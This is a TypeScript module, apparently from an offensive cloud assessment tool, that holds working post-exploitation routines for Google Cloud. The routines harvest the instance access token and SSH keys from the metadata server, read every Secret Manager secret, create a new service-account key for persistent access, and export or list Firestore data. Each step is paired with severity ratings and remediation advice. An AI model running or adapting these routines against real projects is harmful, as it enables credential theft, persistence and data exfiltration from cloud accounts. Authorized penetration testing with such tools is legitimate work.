import { gcloud, run, resolveProject, argVal, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function metadataHarvestGcp(_args: string[], _timeout: number): Promise<HookResult> {
  const base = "http://metadata.google.internal/computeMetadata/v1"
  const headers = { "Metadata-Flavor": "Google" }
  const findings: Finding[] = []
  const endpoints = {
    project_id: "/project/project-id",
    zone: "/instance/zone",
    hostname: "/instance/hostname",
    instance_name: "/instance/name",
    service_accounts: "/instance/service-accounts/?recursive=true",
    access_token: "/instance/service-accounts/default/token",
    ssh_keys: "/project/attributes/ssh-keys",
  }

  const output: string[] = ["[*] Probing GCP metadata endpoint...\n"]

  for (const [name, path] of Object.entries(endpoints)) {
    try {
      const resp = await fetch(`${base}${path}`, { headers, signal: AbortSignal.timeout(5000) })
      if (!resp.ok) {
        output.push(`[-] ${name}: HTTP ${resp.status}`)
        continue
      }
      const text = await resp.text()
      if (name === "access_token") {
        const parsed = tryJson(text)
        output.push(
          `[+] ${name}: ${String(parsed?.access_token || "").slice(0, 20)}... (expires: ${parsed?.expires_in}s)`,
        )
        findings.push({
          checkId: "GCP-META-001",
          provider: "gcp",
          severity: "critical",
          status: "EXTRACTED",
          resource: "metadata/access_token",
          title: "GCE access token extracted from metadata",
          details: `Token prefix: ${String(parsed?.access_token || "").slice(0, 20)}..., expires in ${parsed?.expires_in}s`,
          remediation: "Use Workload Identity instead of metadata-based tokens",
        })
      } else {
        output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
      }
    } catch {
      output.push(`[-] ${name}: not accessible (not on GCP?)`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function secretsDumpGcp(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const secretId = argVal(args, "--secret-id")
  const findings: Finding[] = []

  if (secretId) {
    const r = await gcloud(
      ["secrets", "versions", "access", "latest", "--secret", secretId, "--project", project],
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] Cannot access secret ${secretId}: ${r.stderr.trim()}`, findings }
    findings.push({
      checkId: "GCP-SECRET-001",
      provider: "gcp",
      severity: "critical",
      status: "EXTRACTED",
      resource: `secret/${secretId}`,
      title: `Secret extracted: ${secretId}`,
      details: `${r.stdout.length} bytes from Secret Manager`,
      remediation: "Rotate secret and review IAM bindings",
    })
    return {
      output: `[+] Secret '${secretId}' (${r.stdout.length} bytes):\n${r.stdout.slice(0, 500)}${r.stdout.length > 500 ? "..." : ""}`,
      findings,
    }
  }

  const lr = await gcloud(["secrets", "list", "--project", project, "--format=json"], timeout)
  if (lr.exitCode !== 0) return { output: `[-] Cannot list secrets: ${lr.stderr.trim()}`, findings }
  const secrets = tryJson(lr.stdout) || []
  const output = [`[*] Found ${secrets.length} secret(s) in project ${project}\n`]

  for (const s of secrets) {
    const name = s.name?.split("/").pop() || s.name
    const vr = await gcloud(
      ["secrets", "versions", "access", "latest", "--secret", name, "--project", project],
      timeout,
    )
    if (vr.exitCode === 0) {
      output.push(`[+] ${name}: ${vr.stdout.slice(0, 80)}${vr.stdout.length > 80 ? "..." : ""}`)
      findings.push({
        checkId: "GCP-SECRET-001",
        provider: "gcp",
        severity: "critical",
        status: "EXTRACTED",
        resource: `secret/${name}`,
        title: `Secret extracted: ${name}`,
        details: `${vr.stdout.length} bytes`,
        remediation: "Rotate secret and review IAM bindings",
      })
    } else {
      output.push(`[-] ${name}: access denied`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function saKeyCreate(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const saEmail = argVal(args, "--sa-email")
  const findings: Finding[] = []

  if (!saEmail) return { output: "ERROR: --sa-email required", findings }

  const output: string[] = [`[*] Service account key creation — ${saEmail}\n`]

  const existing = await gcloud(
    ["iam", "service-accounts", "keys", "list", "--iam-account", saEmail, "--format=json", "--managed-by=user"],
    timeout,
  )
  if (existing.exitCode === 0) {
    const keys = tryJson(existing.stdout) || []
    output.push(`[*] Existing user-managed keys: ${keys.length}`)
  }

  const keyFile = `/tmp/cs-sa-key-${Date.now()}.json`
  const create = await gcloud(
    ["iam", "service-accounts", "keys", "create", keyFile, "--iam-account", saEmail, "--project", project],
    timeout,
  )
  if (create.exitCode !== 0) {
    output.push(`[-] Key creation failed: ${create.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const keyContent = await Bun.file(keyFile).text().catch(() => "")
  const keyData = tryJson(keyContent)
  output.push(`[+] Key created successfully`)
  output.push(`    SA: ${saEmail}`)
  output.push(`    Key ID: ${keyData?.private_key_id || "unknown"}`)
  output.push(`    Key file: ${keyFile}`)
  output.push(`    Type: ${keyData?.type || "service_account"}`)

  try {
    const { unlink } = await import("node:fs/promises")
    await unlink(keyFile)
    output.push(`[*] Key file cleaned from disk`)
  } catch {}

  findings.push({
    checkId: "GCP-SAKEY-001",
    provider: "gcp",
    severity: "critical",
    status: "CREATED",
    resource: saEmail,
    title: `SA key created: ${saEmail}`,
    details: `New user-managed key created for ${saEmail} — provides persistent access`,
    remediation: `Delete key: gcloud iam service-accounts keys delete KEY_ID --iam-account ${saEmail}`,
  })

  return { output: output.join("\n"), findings }
}

export async function firestoreDump(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const collection = argVal(args, "--collection")
  const limit = argVal(args, "--limit") || "20"
  const findings: Finding[] = []
  const output: string[] = [`[*] Firestore enumeration — project: ${project}\n`]

  const dbs = await gcloud(["firestore", "databases", "list", "--project", project, "--format=json"], timeout)
  if (dbs.exitCode === 0) {
    const dbList = tryJson(dbs.stdout) || []
    output.push(`[+] Firestore databases: ${dbList.length}`)
    for (const d of dbList) {
      const name = d.name?.split("/").pop() || "(default)"
      output.push(`    ${name} type=${d.type || "NATIVE"} location=${d.locationId || "unknown"}`)
    }
  }

  if (!collection) {
    const indexes = await gcloud(["firestore", "indexes", "composite", "list", "--project", project, "--format=json"], timeout)
    if (indexes.exitCode === 0) {
      const idxList = tryJson(indexes.stdout) || []
      output.push(`\n[+] Composite indexes: ${idxList.length}`)
    }

    const exportCmd = await run(
      "gcloud",
      ["firestore", "export", `gs://${project}-firestore-export`, "--project", project, "--async", "--format=json"],
      timeout,
    )
    if (exportCmd.exitCode === 0) {
      output.push(`\n[+] Firestore export initiated to gs://${project}-firestore-export`)
      findings.push({
        checkId: "GCP-FIRESTORE-001",
        provider: "gcp",
        severity: "critical",
        status: "EXPORTING",
        resource: `firestore/${project}`,
        title: `Firestore export started for ${project}`,
        details: `Export to gs://${project}-firestore-export`,
        remediation: "Delete export bucket and review Firestore IAM",
      })
    } else {
      output.push(`\n[*] Firestore export requires a GCS bucket — create gs://${project}-firestore-export first`)
    }

    return { output: output.join("\n"), findings }
  }

  output.push(`\n[*] Collection: ${collection} (limit: ${limit})`)
  const query = await run(
    "gcloud",
    ["alpha", "firestore", "documents", "list", `projects/${project}/databases/(default)/documents/${collection}`, "--limit", limit, "--format=json"],
    timeout,
  )
  if (query.exitCode === 0) {
    const docs = tryJson(query.stdout) || []
    output.push(`[+] Documents: ${docs.length}`)
    for (const d of docs.slice(0, 10)) {
      const docId = d.name?.split("/").pop() || ""
      output.push(`    ${docId}: ${JSON.stringify(d.fields || {}).substring(0, 200)}`)
    }
    findings.push({
      checkId: "GCP-FIRESTORE-001",
      provider: "gcp",
      severity: "high",
      status: "EXTRACTED",
      resource: `firestore/${collection}`,
      title: `Firestore data extracted: ${collection}`,
      details: `${docs.length} documents from collection ${collection}`,
      remediation: "Review Firestore Security Rules and IAM bindings",
    })
  } else {
    output.push(`[-] Query failed: ${query.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}
